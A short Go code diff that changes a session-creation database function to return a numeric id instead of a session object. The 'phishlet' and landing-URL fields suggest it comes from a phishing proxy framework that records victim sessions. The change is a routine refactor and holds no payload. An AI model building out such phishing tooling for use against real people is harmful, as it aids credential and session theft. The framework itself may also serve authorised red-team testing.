@@ -37,10 +37,10 @@ func (d *Database) sessionsInit() {
 	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
 }
 
-func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
+func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (int, error) {
 	_, err := d.sessionsGetBySid(sid)
 	if err == nil {
-		return nil, fmt.Errorf("session already exists: %s", sid)
+		return -1, fmt.Errorf("session already exists: %s", sid)
 	}
 
 	id, _ := d.getNextId(SessionTable)
@@ -67,9 +67,9 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		return nil
 	})
 	if err != nil {
-		return nil, err
+		return -1, err
 	}
-	return s, nil
+	return id, nil
 }
 
 func (d *Database) sessionsList() ([]*Session, error) {
